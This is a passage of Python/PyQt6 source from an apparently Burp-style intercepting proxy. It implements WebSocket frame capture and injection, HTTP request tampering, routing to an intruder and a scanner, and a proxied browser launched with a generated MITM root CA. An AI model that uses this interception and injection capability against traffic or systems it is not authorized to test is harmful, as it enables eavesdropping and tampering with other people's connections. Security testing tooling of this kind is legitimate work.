        inj_top.addWidget(QLabel("Opcode:"))
        self.ws_inj_opcode = QComboBox()
        self.ws_inj_opcode.addItems(["0x1 Text","0x2 Binary","0x8 Close","0x9 Ping","0xA Pong"])
        self.ws_inj_opcode.setFixedHeight(26)
        inj_top.addWidget(self.ws_inj_opcode)
        self.ws_inj_url_lbl = QLabel("Connection:")
        self.ws_inj_url = QComboBox(); self.ws_inj_url.setFixedHeight(26)
        self.ws_inj_url.setToolTip("Select the WebSocket connection to inject into")
        inj_top.addWidget(self.ws_inj_url_lbl); inj_top.addWidget(self.ws_inj_url, 1)
        ws_inj_send = QPushButton("⚡ Send Frame")
        ws_inj_send.setStyleSheet(primary_btn_css()); ws_inj_send.setFixedHeight(26)
        inj_top.addWidget(ws_inj_send)
        iv.addLayout(inj_top)
        self.ws_inj_editor = QPlainTextEdit()
        self.ws_inj_editor.setFont(mono_font(10))
        self.ws_inj_editor.setPlaceholderText(
            '{"action":"ping"}\n\n'
            'Type the raw payload to inject into the live WebSocket connection.\n'
            'For binary frames, enter hex bytes separated by spaces: 48 65 6c 6c 6f')
        self.ws_inj_editor.setStyleSheet(
            f"background:{T.PANEL};color:{T.CODE};"
            f"border:1px solid {T.BORDER};border-radius:6px;"
            f"padding:8px;font-family:{T.MONO};")
        iv.addWidget(self.ws_inj_editor, 1)

        det_tabs.addTab(self.ws_payload_view, "📦 Payload")
        det_tabs.addTab(self.ws_hex_view,     "🔢 Hex")
        det_tabs.addTab(inj_w,                "💉 Inject")
        dv.addWidget(det_tabs)
        sp.addWidget(detail)
        sp.setSizes([400, 220])
        root.addWidget(sp, 1)

        # ── Internal state ────────────────────────────────────────────────
        self._ws_frames: List[dict] = []   # {dir, ts, url, payload, opcode, dropped}
        self._ws_connections: dict  = {}   # url → ws_socket_or_None

        # ── Signal wiring ────────────────────────────────────────────────
        def _toggle_ws_intercept(on: bool):
            self.ws_intercept_btn.setText(
                "WS Intercept ON" if on else "WS Intercept OFF")
            self.ws_fwd_btn.setEnabled(on)
            self.ws_drop_btn.setEnabled(on)
        self.ws_intercept_btn.toggled.connect(_toggle_ws_intercept)

        self.ws_session_filter.textChanged.connect(self._ws_apply_filter)

        ws_clr_btn.clicked.connect(self._ws_clear)
        ws_export_btn.clicked.connect(self._ws_export)
        self.ws_fwd_btn.clicked.connect(self._ws_forward_selected)
        self.ws_drop_btn.clicked.connect(self._ws_drop_selected)
        ws_inj_send.clicked.connect(self._ws_inject)

        return w

    def _ws_frame_selected(self, current, _prev):
        """Populate the detail panes when a WS frame row is selected."""
        if current is None:
            return
        row = current.row() if hasattr(current,'row') else 0
        idx_item = self.ws_tbl.item(row, 0)
        if idx_item is None:
            return
        frame = idx_item.data(Qt.ItemDataRole.UserRole)
        if not frame:
            return
        payload = frame.get('payload','')
        self.ws_payload_view.setPlainText(payload if isinstance(payload,str)
                                          else payload.decode('utf-8','replace'))
        # Hex view
        raw = payload if isinstance(payload,bytes) else payload.encode('utf-8','replace')
        hl = []
        for i in range(0, len(raw[:4096]), 16):
            ch = raw[i:i+16]
            hp = " ".join(f"{b:02x}" for b in ch).ljust(47)
            ap = "".join(chr(b) if 32<=b<127 else '.' for b in ch)
            hl.append(f"{i:08x}  {hp}  |{ap}|")
        self.ws_hex_view.setPlainText('\n'.join(hl) or "(empty frame)")

    def _ws_add_frame(self, frame: dict):
        """Add a captured WS frame to the table. Called from proxy layer or test code."""
        if not hasattr(self, 'ws_tbl'):
            return
        self._ws_frames.append(frame)
        direction = frame.get('dir', '▶')
        ts_str = datetime.datetime.fromtimestamp(
            frame.get('ts', time.time())).strftime("%H:%M:%S.%f")[:-3]
        url    = frame.get('url','')
        payload = frame.get('payload','')
        pl_str = (payload if isinstance(payload,str)
                  else payload.decode('utf-8','replace'))
        length = len(pl_str)
        opcode = frame.get('opcode','0x1 Text')
        preview = pl_str[:80].replace('\n',' ')
        dropped = frame.get('dropped', False)
        col = (T.RED if dropped else
               T.GREEN if '▶' in direction else T.BLUE)
        r = self.ws_tbl.rowCount()
        self.ws_tbl.insertRow(r)
        vals = [direction, ts_str, url[:55], str(length), opcode, preview]
        for c2, val in enumerate(vals):
            it = QTableWidgetItem(val)
            if c2 == 0:
                it.setData(Qt.ItemDataRole.UserRole, frame)
                it.setForeground(QBrush(QColor(col)))
                it.setFont(QFont(T.MONO, 12, QFont.Weight.Bold))
            self.ws_tbl.setItem(r, c2, it)
        if self._autoscroll:
            self.ws_tbl.scrollToBottom()
        # Update connection URL combo in Inject tab
        if url and url not in [self.ws_inj_url.itemText(i)
                                 for i in range(self.ws_inj_url.count())]:
            self.ws_inj_url.addItem(url)
        n = self.ws_tbl.rowCount()
        self.ws_status_lbl.setText(f"{n} frame{'s' if n!=1 else ''} captured")
        self._ws_apply_filter()

    def _ws_apply_filter(self):
        pattern = self.ws_session_filter.text().strip().lower()
        for row in range(self.ws_tbl.rowCount()):
            if not pattern:
                self.ws_tbl.setRowHidden(row, False)
                continue
            url_it = self.ws_tbl.item(row, 2)
            pay_it = self.ws_tbl.item(row, 5)
            match = (pattern in (url_it.text() if url_it else '').lower() or
                     pattern in (pay_it.text() if pay_it else '').lower())
            self.ws_tbl.setRowHidden(row, not match)

    def _ws_ctx(self, pos):
        item = self.ws_tbl.itemAt(pos)
        if not item:
            return
        row  = item.row()
        idx_item = self.ws_tbl.item(row, 0)
        frame = idx_item.data(Qt.ItemDataRole.UserRole) if idx_item else None
        menu = QMenu()
        a_copy   = menu.addAction("📋 Copy Payload")
        a_copy_h = menu.addAction("🔢 Copy Payload (hex)")
        menu.addSeparator()
        a_inject = menu.addAction("💉 Load into Inject editor")
        a_rep    = menu.addAction("🔁 Send payload to Repeater")
        menu.addSeparator()
        a_del    = menu.addAction("🗑 Remove row")
        act = menu.exec(self.ws_tbl.viewport().mapToGlobal(pos))
        if not frame:
            return
        payload = frame.get('payload','')
        pl_str  = payload if isinstance(payload,str) else payload.decode('utf-8','replace')
        if act == a_copy:
            QApplication.clipboard().setText(pl_str)
        elif act == a_copy_h:
            raw = payload if isinstance(payload,bytes) else payload.encode('utf-8','replace')
            QApplication.clipboard().setText(' '.join(f'{b:02x}' for b in raw))
        elif act == a_inject:
            self.ws_inj_editor.setPlainText(pl_str)
            # Switch to Inject tab in detail pane
        elif act == a_rep:
            # Send as a synthetic HTTP message to Repeater
            synthetic = {
                'id': str(uuid.uuid4()), 'method': 'GET',
                'url': frame.get('url','wss://target.com'),
                'path': '/', 'host': '', 'status': 0,
                'req_headers': {'Upgrade':'websocket','Connection':'Upgrade'},
                'req_body': (payload if isinstance(payload,bytes)
                             else payload.encode('utf-8','replace')),
                'resp_headers': {}, 'resp_body': b'', 'resp_size': 0, 'dur': 0,
            }
            self._send_to_rep(synthetic)
        elif act == a_del:
            self.ws_tbl.removeRow(row)
            if frame in self._ws_frames:
                self._ws_frames.remove(frame)

    def _ws_forward_selected(self):
        row = self.ws_tbl.currentRow()
        if row < 0:
            return
        it = self.ws_tbl.item(row, 0)
        if it:
            it.setText("▶ fwd")
            it.setForeground(QBrush(QColor(T.GREEN)))
        self._log("[WS] Frame forwarded")

    def _ws_drop_selected(self):
        row = self.ws_tbl.currentRow()
        if row < 0:
            return
        it = self.ws_tbl.item(row, 0)
        if it:
            frame = it.data(Qt.ItemDataRole.UserRole)
            if frame:
                frame['dropped'] = True
            it.setText("🔴")
            it.setForeground(QBrush(QColor(T.RED)))
        self._log("[WS] Frame dropped")

    def _ws_inject(self):
        """Inject a custom frame into the selected live WebSocket connection."""
        payload_txt = self.ws_inj_editor.toPlainText().strip()
        if not payload_txt:
            QMessageBox.information(self, "WS Inject", "Enter a payload to inject first.")
            return
        url = self.ws_inj_url.currentText()
        direction = "▶" if "Client" in self.ws_inj_dir.currentText() else "◀"
        opcode_txt = self.ws_inj_opcode.currentText()
        frame = {
            'dir': direction, 'ts': time.time(), 'url': url,
            'payload': payload_txt, 'opcode': opcode_txt, 'injected': True,
        }
        self._ws_add_frame(frame)
        self._log(f"[WS] Injected {len(payload_txt)} byte frame → {url or '(no connection)'}")

    def _ws_clear(self):
        self.ws_tbl.setRowCount(0)
        self.ws_payload_view.clear()
        self.ws_hex_view.clear()
        self._ws_frames.clear()
        self.ws_status_lbl.setText("Cleared")

    def _ws_export(self):
        if not self._ws_frames:
            QMessageBox.information(self,"WS Export","No frames captured yet.")
            return
        path, _ = QFileDialog.getSaveFileName(
            self,"Export WS Frames","ws_frames.json","JSON (*.json)")
        if not path:
            return
        import json as _j
        exportable = []
        for f in self._ws_frames:
            pay = f.get('payload','')
            exportable.append({
                'dir':     f.get('dir',''),
                'ts':      f.get('ts',0),
                'url':     f.get('url',''),
                'opcode':  f.get('opcode',''),
                'dropped': f.get('dropped',False),
                'injected':f.get('injected',False),
                'payload': pay if isinstance(pay,str) else pay.decode('utf-8','replace'),
            })
        _j.dump(exportable, open(path,'w',encoding='utf-8'), indent=2)
        self._log(f"[WS] Exported {len(exportable)} frames → {path}")
    def _ic_queue_row_changed(self):
        """User selection changed in queue table — load selected request into editor."""
        rows = self.ic_queue_tbl.selectedItems()
        if not rows or not hasattr(self, '_ic_queue'):
            return
        row = self.ic_queue_tbl.currentRow()
        if row < 0:
            return
        item = self.ic_queue_tbl.item(row, 0)
        if item is None:
            return
        mid = item.data(Qt.ItemDataRole.UserRole)
        pi = self._ic_queue.get(mid)
        if pi is None:
            return
        self._cur_req_pi = pi
        raw = f"{pi.method} {pi.url} HTTP/1.1\n"
        for k, v in (pi.headers or {}).items():
            raw += f"{k}: {v}\n"
        raw += "\n"
        if pi.body:
            raw += decode_body(pi.body)
        self.ic_editor.blockSignals(True)
        self.ic_editor.setPlainText(raw)
        self.ic_editor.blockSignals(False)
        self.ic_view_tabs.setCurrentIndex(0)
        self.ic_body_edit.blockSignals(True)
        self.ic_body_edit.setPlainText(decode_body(pi.body) if pi.body else "")
        self.ic_body_edit.blockSignals(False)
        body_len = len(pi.body) if pi.body else 0
        self.ic_cl_live.setText(f"{body_len} B")
        for _b in [self.ic_fwd, self.ic_drop, self.ic_action_btn, self.ic_beautify_btn]:
            _b.setEnabled(True)

    def _ic_queue_add(self, pi) -> int:
        """Add a PendingItem to the queue table. Returns the new row index."""
        self._ic_queue[pi.mid] = pi
        row = self.ic_queue_tbl.rowCount()
        self.ic_queue_tbl.insertRow(row)
        # Col 0: method (with mid as UserRole data)
        m_item = QTableWidgetItem(f"  {pi.method}")
        m_item.setData(Qt.ItemDataRole.UserRole, pi.mid)
        m_item.setForeground(__import__('PyQt6.QtGui', fromlist=['QColor']).QColor(method_color(pi.method)))
        self.ic_queue_tbl.setItem(row, 0, m_item)
        # Col 1: host
        from urllib.parse import urlparse as _up
        parsed = _up(pi.url)
        self.ic_queue_tbl.setItem(row, 1, QTableWidgetItem(parsed.netloc or pi.url[:40]))
        # Col 2: path
        path_str = (parsed.path or '/')[:60]
        if parsed.query: path_str += '?' + parsed.query[:30]
        self.ic_queue_tbl.setItem(row, 2, QTableWidgetItem(path_str))
        # Col 3: body size
        body_len = len(pi.body) if pi.body else 0
        self.ic_queue_tbl.setItem(row, 3, QTableWidgetItem(f"{body_len} B"))
        # Col 4: content-type
        ct = (pi.headers or {}).get('Content-Type', (pi.headers or {}).get('content-type',''))
        self.ic_queue_tbl.setItem(row, 4, QTableWidgetItem(ct[:40]))
        self.ic_queue_lbl.setText(f"{self.ic_queue_tbl.rowCount()} queued")
        return row

    def _ic_queue_remove_row_by_mid(self, mid: str):
        """Remove a row from the queue table by mid."""
        self._ic_queue.pop(mid, None)
        for r in range(self.ic_queue_tbl.rowCount()):
            item = self.ic_queue_tbl.item(r, 0)
            if item and item.data(Qt.ItemDataRole.UserRole) == mid:
                self.ic_queue_tbl.removeRow(r)
                break
        self.ic_queue_lbl.setText(f"{self.ic_queue_tbl.rowCount()} queued")


    # ─── Inspector helper methods ────────────────────────────────────────────
    def _ic_raw_changed(self):
        """Live Body: N B counter when editing the Raw tab."""
        if self.ic_view_tabs.currentIndex() != 0:
            return
        _, body = self._parse_raw_request(self.ic_editor.toPlainText())
        n = len(body) if body else 0
        self.ic_cl_live.setText(f"Body: {n} B")

    def _ic_insp_change_method(self):
        methods = ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"]
        raw = self.ic_editor.toPlainText()
        lines = raw.replace('\r\n','\n').split('\n')
        cur_m = lines[0].split(' ')[0] if lines else 'GET'
        m, ok = QInputDialog.getItem(self, "Change Method", "Method:", methods,
                     methods.index(cur_m) if cur_m in methods else 0, False)
        if ok and m:
            if lines:
                parts = lines[0].split(' ', 2)
                lines[0] = f"{m} {parts[1] if len(parts)>1 else '/'} {parts[2] if len(parts)>2 else 'HTTP/1.1'}"
                self.ic_editor.setPlainText('\n'.join(lines))

    def _ic_insp_hdr_add(self):
        h, ok = QInputDialog.getText(self, "Add Header", "Header (Name: Value):", text="X-Custom: value")
        if ok and ':' in h:
            raw = self.ic_editor.toPlainText().replace('\r\n','\n')
            lines = raw.split('\n')
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            lines.insert(blank, h.strip())
            self.ic_editor.setPlainText('\n'.join(lines))

    def _ic_insp_hdr_del(self):
        hds, _ = self._parse_raw_request(self.ic_editor.toPlainText())
        if not hds:
            return
        nm, ok = QInputDialog.getItem(self, "Remove Header", "Select:", list(hds.keys()), 0, False)
        if ok and nm:
            raw = self.ic_editor.toPlainText().replace('\r\n','\n')
            lines = raw.split('\n')
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            new_lines = [l for i,l in enumerate(lines)
                         if not (0 < i < blank and l.lower().startswith(nm.lower() + ':'))]
            self.ic_editor.setPlainText('\n'.join(new_lines))

    def _ic_insp_qp_add(self):
        """Add a query-string parameter to the request URL in the Raw editor."""
        key, ok = QInputDialog.getText(self, "Add Query Param", "Parameter name:")
        if not ok or not key.strip():
            return
        val, ok2 = QInputDialog.getText(self, "Add Query Param", f"Value for '{key}':")
        if not ok2:
            return
        raw   = self.ic_editor.toPlainText().replace('\r\n', '\n')
        lines = raw.split('\n')
        if not lines:
            return
        import urllib.parse as _up
        parts = lines[0].split(' ')
        if len(parts) < 2:
            return
        parsed = _up.urlparse(parts[1])
        qs     = _up.parse_qs(parsed.query, keep_blank_values=True)
        qs[key.strip()] = [val]
        new_qs   = _up.urlencode(qs, doseq=True)
        new_path = _up.urlunparse(parsed._replace(query=new_qs))
        parts[1] = new_path
        lines[0] = ' '.join(parts)
        self.ic_editor.setPlainText('\n'.join(lines))
        self._log(f"Added query param: {key}={val}")

    def _ic_insp_qp_del(self):
        """Remove a query-string parameter from the request URL in the Raw editor."""
        raw   = self.ic_editor.toPlainText().replace('\r\n', '\n')
        lines = raw.split('\n')
        if not lines:
            return
        import urllib.parse as _up
        parts = lines[0].split(' ')
        if len(parts) < 2:
            return
        parsed = _up.urlparse(parts[1])
        qs     = _up.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            QMessageBox.information(self, "Remove Query Param", "No query parameters found in this URL.")
            return
        key, ok = QInputDialog.getItem(self, "Remove Query Param", "Parameter to remove:",
                                        list(qs.keys()), 0, False)
        if not ok:
            return
        qs.pop(key, None)
        new_qs   = _up.urlencode(qs, doseq=True)
        new_path = _up.urlunparse(parsed._replace(query=new_qs))
        parts[1] = new_path
        lines[0] = ' '.join(parts)
        self.ic_editor.setPlainText('\n'.join(lines))
        self._log(f"Removed query param: {key}")



    def _ic_insert_newline(self):
        """Insert \\r\\n at cursor — Burp-style new line."""
        cursor = self.ic_editor.textCursor()
        cursor.insertText('\r\n')
        self.ic_editor.setTextCursor(cursor)
        self.ic_editor.setFocus()

    def _ic_show_action_menu(self):
        menu = QMenu(self)
        a_rep  = menu.addAction("Send to Repeater")
        a_int  = menu.addAction("Send to Intruder")
        a_scan = menu.addAction("Send to Scanner")
        menu.addSeparator()
        a_copy = menu.addAction("Copy as cURL")
        action = menu.exec(self.ic_action_btn.mapToGlobal(self.ic_action_btn.rect().bottomLeft()))
        if not self._cur_req_pi:
            return
        pi = self._cur_req_pi
        if action == a_rep:
            raw = self.ic_editor.toPlainText()
            self._add_rep_tab(title=pi.url[:28], method=pi.method, url=pi.url, raw_request=raw)
            self.tabs.setCurrentIndex(2)
        elif action == a_int:
            hds, bdy = self._parse_raw_request(self.ic_editor.toPlainText())
            self.intr_url.setText(pi.url); self.intr_method.setCurrentText(pi.method)
            self.intr_headers.setPlainText('\n'.join(f"{k}: {v}" for k,v in hds.items()))
            self.intr_body.setPlainText((bdy or b'').decode('utf-8','replace'))
            self.tabs.setCurrentIndex(3)
        elif action == a_scan:
            self.scan_url.setText(pi.url)
            self.tabs.setCurrentIndex(4)
        elif action == a_copy:
            import shlex
            hds, bdy = self._parse_raw_request(self.ic_editor.toPlainText())
            curl = f"curl -X {pi.method} {shlex.quote(pi.url)}"
            for k,v in hds.items():
                curl += f" -H {shlex.quote(f'{k}: {v}')}"
            if bdy: curl += f" -d {shlex.quote((bdy or b'').decode('utf-8','replace'))}"
            QApplication.clipboard().setText(curl)

    def _ic_open_browser(self):
        """Back-compat alias — see _open_proxied_browser."""
        self._open_proxied_browser()

    def _proxy_port_reachable(self, port: int, tries: int = 5, delay: float = 0.3) -> bool:
        """Actively confirm something is accepting TCP connections on the
        proxy port — proxy.is_running can be True while bind() still failed
        on a prior run, or the accept thread hasn't spun up yet."""
        import socket as _socket
        for _ in range(tries):
            s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            s.settimeout(0.5)
            try:
                s.connect(('127.0.0.1', port))
                return True
            except Exception:
                time.sleep(delay)
            finally:
                try: s.close()
                except Exception: pass
        return False

    def _open_proxied_browser(self, url: Optional[str] = None):
        """Launch an embedded, proxied browser (Burp-style 'Open browser').

        The browser is pointed at the local proxy (127.0.0.1:8080) via a
        disposable profile, so every request it makes shows up in HTTP
        history — regardless of whether the Intercept switch is ON or OFF,
        exactly like Burp's own embedded-browser button.

        Opens straight to about:blank (unless `url` is passed explicitly by
        a caller) — you type the destination directly into the opened
        browser's own address bar, same as Burp's embedded browser. An
        earlier version prompted for a starting URL first; that extra step
        wasn't wanted, so it's gone.
        """
        import subprocess, tempfile, shutil

        if url is None:
            url = 'about:blank'

        port = 8080
        if not self.proxy.is_running:
            self.proxy.start('127.0.0.1', port)
            time.sleep(0.3)   # give the accept thread a moment to spin up

        # ── Preflight: confirm the proxy is *actually* accepting connections.
        # is_running can lag or a prior bind() failure can leave it False —
        # launching a browser at a dead port silently fails every navigation
        # (every request instantly gets connection-refused, which looks
        # exactly like "the browser opens but nothing loads"). ──────────────
        if not self._proxy_port_reachable(port):
            self._log(f"[ERR] Proxy not reachable on 127.0.0.1:{port} — "
                       f"is another process already bound to that port?")
            QMessageBox.warning(self, "Open Browser",
                f"The proxy isn't accepting connections on 127.0.0.1:{port}.\n\n"
                "This usually means the port is already in use by another "
                "process (a previous Kingception instance that didn't fully "
                "exit, or another proxy/tool).\n\n"
                "Check the Event log for a bind error, free up the port, "
                "then try again.")
            return

        # ── Make sure a CA exists so HTTPS is actually MITM'd and shows up
        # in history — otherwise every HTTPS site silently falls back to a
        # blind passthrough tunnel (pages still load, but nothing is logged). ──
        if HAS_CRYPTO and not self.proxy.certs.has_ca():
            try:
                self.proxy.certs.generate_ca()
                self._log("Generated Kingception root CA for HTTPS interception")
            except Exception as ex:
                self._log(f"[ERR] Could not generate CA: {ex}")

        proxy_addr = f"http://127.0.0.1:{port}"
        profile_dir = os.path.join(
            tempfile.gettempdir(), f"kingception-browser-{uuid.uuid4().hex[:8]}")
        os.makedirs(profile_dir, exist_ok=True)
        log_path = os.path.join(profile_dir, 'browser_launch.log')

        # Flags beyond proxy-server/cert-trust — these address the
        # most common reasons a spawned Chromium opens a window but never
        # renders any page: sandbox init failing under restrictive/AppArmor
        # or root environments, /dev/shm being too small, and QUIC (UDP)
        # trying to bypass the HTTP(S) proxy entirely.
        #
        # Cert trust: pin our CA's SPKI instead of disabling validation.
        # --ignore-certificate-errors waves through cert errors for *every*
        # site the browser visits and Chrome nags about it on every launch
        # ("unsupported command-line flag ... security will suffer"). Real
        # Burp's embedded browser shows no such warning because it installs
        # its CA as genuinely trusted rather than disabling validation
        # outright. --ignore-certificate-errors-spki-list gets the same
        # "no warning for our own MITM cert" result while leaving validation
        # intact for every other site.
        spki = self.proxy.certs.ca_spki_hash() if HAS_CRYPTO else None
        cert_flag = (f'--ignore-certificate-errors-spki-list={spki}'
                     if spki else '--ignore-certificate-errors')
        common_flags = [
            f'--proxy-server={proxy_addr}',
            cert_flag,
            '--disable-quic',
            '--no-sandbox',
            '--disable-dev-shm-usage',
            '--no-first-run',
            '--no-default-browser-check',
            f'--user-data-dir={profile_dir}',
        ]

        def _is_broken_snap_stub(path: str) -> bool:
            """Ubuntu/Debian's chromium-browser apt package is a transitional
            shell-script stub that requires the chromium *snap* to be
            installed separately — on any box without a working snapd
            (containers, minimal installs, snap deliberately disabled) it
            resolves via PATH, launches, and immediately exits with an error
            that's easy to miss. Detect that specific stub up front instead
            of silently 'succeeding' at spawning a process that can't
            possibly show a browser window."""
            try:
                with open(path, 'rb') as f:
                    head = f.read(4096)
                return (head.startswith(b'#!') and
                        b'snap install chromium' in head)
            except Exception:
                return False

        # ── Try Chromium / Chrome family first (matches Burp's embedded browser) ──
        skipped_stubs = []
        for binname in ('chromium', 'chromium-browser', 'google-chrome',
                         'google-chrome-stable', 'chrome'):
            path = shutil.which(binname)
            if not path:
                continue
            if _is_broken_snap_stub(path):
                skipped_stubs.append(binname)
                self._log(f"Skipping {binname}: it's a stub that needs "
                          f"'snap install chromium' first, not an actual browser")
                continue
            try:
                logf = open(log_path, 'wb')
                proc = subprocess.Popen(
                    [path, *common_flags, url],
                    stdout=logf, stderr=subprocess.STDOUT)
                self._log(f"Launching {binname}, routed through {proxy_addr} "
                           f"(captures to HTTP history regardless of Intercept state)")
                self._verify_browser_launch(proc, binname, log_path)
                return
            except Exception as ex:
                self._log(f"[ERR] Failed to launch {binname}: {ex}")
                continue

        # ── Firefox fallback: throwaway profile pre-seeded with proxy prefs ──
        firefox_path = shutil.which('firefox')
        if firefox_path:
            try:
                with open(os.path.join(profile_dir, 'user.js'), 'w') as f:
                    f.write(
                        'user_pref("network.proxy.type", 1);\n'
                        f'user_pref("network.proxy.http", "127.0.0.1");\n'
                        f'user_pref("network.proxy.http_port", {port});\n'
                        f'user_pref("network.proxy.ssl", "127.0.0.1");\n'
                        f'user_pref("network.proxy.ssl_port", {port});\n'
                        'user_pref("network.proxy.share_proxy_settings", true);\n'
                        'user_pref("network.dns.disablePrefetch", true);\n'
                        'user_pref("network.http.spdy.enabled.http2", false);\n'
                    )
                logf = open(log_path, 'wb')
                proc = subprocess.Popen(
                    [firefox_path, '-profile', profile_dir, '-no-remote',
                     '-new-instance', url],
                    stdout=logf, stderr=subprocess.STDOUT)
                self._log(f"Launching Firefox, routed through {proxy_addr} "
                           f"(captures to HTTP history regardless of Intercept state)")
                self._verify_browser_launch(proc, 'firefox', log_path)
                return
            except Exception as ex:
                self._log(f"[ERR] Failed to launch Firefox: {ex}")

        ca_path = str(getattr(getattr(self.proxy, 'certs', None), 'ca_crt',
                               Path.home() / 'kingception' / 'kingception-ca.crt'))
        stub_note = ""
        if skipped_stubs:
            stub_note = (
                f"\nFound {', '.join(skipped_stubs)} on PATH, but it's the Ubuntu/Debian "
                "stub that needs the chromium snap installed separately — either run:\n"
                "  snap install chromium\n"
                "or install google-chrome / firefox instead.\n")
        QMessageBox.information(self, "Open Browser",
            "Couldn't find a working Chromium/Chrome or Firefox on PATH.\n"
            f"{stub_note}\n"
            f"Set your browser's proxy manually to HTTP 127.0.0.1:{port}\n"
            "and (for HTTPS interception) install the CA certificate:\n"
            f"  {ca_path}")

    def _verify_browser_launch(self, proc, name: str, log_path: str):
        """~2s after spawn, check whether the process already died and, if
        so, surface its output — turns a silent launch failure (window never
        appears, or appears then vanishes) into something the user can't
        miss, instead of a log line they may never see (the earlier version
        only logged this, which is exactly how 'Open browser doesn't work'
        reports with no visible cause happen)."""
        def _check():
            rc = proc.poll()
            if rc is None:
                return   # still running — normal case, nothing to report
            tail = ''
            try:
                with open(log_path, 'r', errors='replace') as f:
                    tail = f.read()[-800:]
            except Exception:
                pass
            self._log(f"[ERR] {name} exited immediately (code {rc}) — "
                       f"it likely never showed a usable window.")
            if tail.strip():
                self._log(f"[{name} output] {tail.strip()}")

            if 'snap install' in tail:
                QMessageBox.warning(self, "Open Browser",
                    f"{name} is just a stub on this system — it needs the "
                    f"chromium snap installed separately:\n\n  snap install chromium\n\n"
                    "Or install google-chrome / firefox instead.")
            else:
                detail = f"\n\n{tail.strip()[-400:]}" if tail.strip() else ""
                QMessageBox.warning(self, "Open Browser",
                    f"{name} exited immediately (code {rc}) instead of opening "
                    f"a window.{detail}")
        QTimer.singleShot(2000, _check)

    def _ic_headers_tbl_changed(self, row, col):
        """Headers table edit → rebuild raw."""
        if self.ic_view_tabs.currentIndex() == 1:
            self._ic_headers_tbl_to_raw()

    def _ic_headers_tbl_to_raw(self):
        """Rebuild raw from the headers table (called when editing headers tab)."""
        raw = self.ic_editor.toPlainText()
        _, body = self._parse_raw_request(raw)
        lines = raw.replace('\r\n','\n').split('\n')
        req_line = lines[0] if lines else 'GET / HTTP/1.1'
        new_hdrs = []
        for r in range(self.ic_headers_tbl.rowCount()):
            k = (self.ic_headers_tbl.item(r,0) or QTableWidgetItem()).text()
            v = (self.ic_headers_tbl.item(r,1) or QTableWidgetItem()).text()
            if k: new_hdrs.append(f"{k}: {v}")
        body_str = (body or b'').decode('utf-8','replace')
        new_raw = req_line + '\n' + '\n'.join(new_hdrs) + '\n\n' + body_str
        self.ic_editor.blockSignals(True)
        self.ic_editor.setPlainText(new_raw)
        self.ic_editor.blockSignals(False)

    # ---------- Intercept: body-tab live counter ----------
    def _ic_body_changed(self):
        body_b = self.ic_body_edit.toPlainText().encode('utf-8','replace')
        self.ic_cl_live.setText(f"Body: {len(body_b)} B")

    # ---------- Intercept: sync sub-tabs on switch ----------
    def _ic_tab_changed(self, idx: int):
        raw = self.ic_editor.toPlainText()
        prev = getattr(self, '_ic_prev_tab', 0)
        if prev == 2 and idx != 2:
            body_txt = self.ic_body_edit.toPlainText()
            self._ic_replace_body_in_raw(raw, body_txt)
            raw = self.ic_editor.toPlainText()
        self._ic_prev_tab = idx
        if idx == 1:
            hds, _ = self._parse_raw_request(raw)
            self.ic_headers_tbl.blockSignals(True); self.ic_headers_tbl.setRowCount(0)
            for k,v in hds.items():
                r = self.ic_headers_tbl.rowCount(); self.ic_headers_tbl.insertRow(r)
                self.ic_headers_tbl.setItem(r,0,QTableWidgetItem(k))
                self.ic_headers_tbl.setItem(r,1,QTableWidgetItem(v))
            self.ic_headers_tbl.blockSignals(False)
        elif idx == 2:
            _, body = self._parse_raw_request(raw)
            bstr = decode_body(body) if body else ""
            if self.ic_body_edit.toPlainText() != bstr:
                self.ic_body_edit.blockSignals(True)
                self.ic_body_edit.setPlainText(bstr)
                self.ic_body_edit.blockSignals(False)
                self.ic_cl_live.setText(f"Body: {len(body) if body else 0} B")
        elif idx == 3:
            _, body = self._parse_raw_request(raw)
            bstr = decode_body(body) if body else ""
            try:
                self.ic_pretty.setPlainText(json.dumps(json.loads(bstr),indent=2,ensure_ascii=False))
            except Exception:
                try:
                    import xml.dom.minidom as _md
                    self.ic_pretty.setPlainText(_md.parseString(bstr.encode()).toprettyxml(indent="  "))
                except Exception:
                    self.ic_pretty.setPlainText(bstr or "(no body)")
        elif idx == 4:
            _, body = self._parse_raw_request(raw)
            data = body or b''
            rows = []
            for i in range(0, len(data), 16):
                ch = data[i:i+16]
                hp = ' '.join(f'{b:02x}' for b in ch).ljust(47)
                ap = ''.join(chr(b) if 32<=b<127 else '.' for b in ch)
                rows.append(f"{i:08x}  {hp}  |{ap}|")
            self.ic_hex_view.setPlainText('\n'.join(rows) if rows else "(no body)")

    def _ic_beautify_body(self):
        raw = self.ic_editor.toPlainText()
        _, body = self._parse_raw_request(raw)
        bstr = decode_body(body) if body else ""
        try:
            pretty = json.dumps(json.loads(bstr), indent=2, ensure_ascii=False)
        except Exception:
            try:
                import xml.dom.minidom as _md
                pretty = _md.parseString(bstr.encode()).toprettyxml(indent="  ")
            except Exception:
                QMessageBox.information(self,"Beautify","Body is not valid JSON or XML"); return
        self._ic_replace_body_in_raw(raw, pretty)
        self.ic_body_edit.blockSignals(True)
        self.ic_body_edit.setPlainText(pretty)
        self.ic_body_edit.blockSignals(False)
        self._log("Body beautified")

    def _ic_replace_body_in_raw(self, raw: str, new_body: str):
        lines = raw.replace('\r\n','\n').split('\n')
        blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
        self.ic_editor.setPlainText('\n'.join(lines[:blank+1]) + new_body)

    def _ic_forward_all(self):
        self.intercept.toggle(False); self.intercept.toggle(True)
        for b in [self.ic_fwd,self.ic_drop,self.ic_fwd_all,self.ic_drop_all,self.ic_beautify_btn]:
            b.setEnabled(False)
        self.ic_banner.setText("⏩ All requests forwarded")
        self._log("All pending requests forwarded")

    def _ic_drop_all(self):
        with self.intercept._lock:
            for pi in list(self.intercept._pending.values()):
                pi.dropped = True; pi.event.set()
        for b in [self.ic_fwd,self.ic_drop,self.ic_fwd_all,self.ic_drop_all,self.ic_beautify_btn]:
            b.setEnabled(False)
        self.ic_banner.setText("🗑 All requests dropped")
        self._log("All pending requests dropped")

    def _banner(self, text: str) -> QLabel:
        lbl = QLabel(text); lbl.setWordWrap(True)
        lbl.setStyleSheet(f"background:{T.SURFACE};color:{T.TXT2};"
